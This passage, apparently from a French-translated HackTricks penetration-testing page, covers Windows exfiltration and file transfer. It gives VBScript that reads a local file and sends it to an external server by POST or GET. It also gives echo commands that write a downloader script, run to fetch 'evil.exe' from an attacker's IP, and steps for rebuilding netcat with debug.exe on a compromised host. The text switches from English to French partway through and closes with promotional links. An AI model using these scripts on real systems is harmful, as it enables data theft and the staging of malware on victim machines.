VBScript is a scripting language developed by Microsoft that is based on Visual Basic. It is commonly used for administrative tasks and automation in Windows environments. VBScript can be executed directly from the command line or from within a script file.

### Exfiltration Techniques

VBScript can be used for exfiltration by writing data to a file and then sending that file to an external server. This can be accomplished using the following code:

```vbscript
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strFile = "C:\data.txt"
strURL = "http://example.com/upload.php"
Set objFile = objFSO.OpenTextFile(strFile, 1)
strData = objFile.ReadAll
objFile.Close
objXMLHTTP.open "POST", strURL, False
objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objXMLHTTP.send "data=" & strData
```

This code creates an XMLHTTP object and a FileSystemObject object. It then reads the contents of a file into a variable, sets the URL of the external server, and sends the data to the server using a POST request.

Another exfiltration technique using VBScript is to encode the data and send it as a parameter in a GET request. This can be accomplished using the following code:

```vbscript
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
strData = "sensitive data"
strURL = "http://example.com/upload.php?data=" & EncodeData(strData)
objXMLHTTP.open "GET", strURL, False
objXMLHTTP.send
```

This code creates an XMLHTTP object and sets the URL of the external server with the encoded data as a parameter in a GET request.

### Detection and Prevention

To detect and prevent exfiltration using VBScript, it is important to monitor network traffic for suspicious activity and to restrict access to sensitive data. Additionally, it is recommended to use encryption and access controls to protect sensitive data from unauthorized access.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Victime**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

C'est une technique folle qui fonctionne sur les machines Windows 32 bits. L'idée est d'utiliser le programme `debug.exe`. Il est utilisé pour inspecter les binaires, comme un débogueur. Mais il peut également les reconstruire à partir de l'hexadécimal. L'idée est donc que nous prenions des binaires, comme `netcat`. Et puis le désassembler en hexadécimal, le coller dans un fichier sur la machine compromise, puis l'assembler avec `debug.exe`.

`Debug.exe` ne peut assembler que 64 ko. Nous devons donc utiliser des fichiers plus petits que cela. Nous pouvons utiliser upx pour le compresser encore plus. Alors faisons cela:
```
upx -9 nc.exe
```
Maintenant, il ne pèse que 29 ko. Parfait. Maintenant, désassemblons-le :
```
wine exe2bat.exe nc.exe nc.txt
```
Maintenant, nous copions-colons simplement le texte dans notre shell Windows. Et cela créera automatiquement un fichier appelé nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Astuce de prime de bug**: **inscrivez-vous** sur **Intigriti**, une plateforme de prime de bug premium créée par des pirates, pour les pirates! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
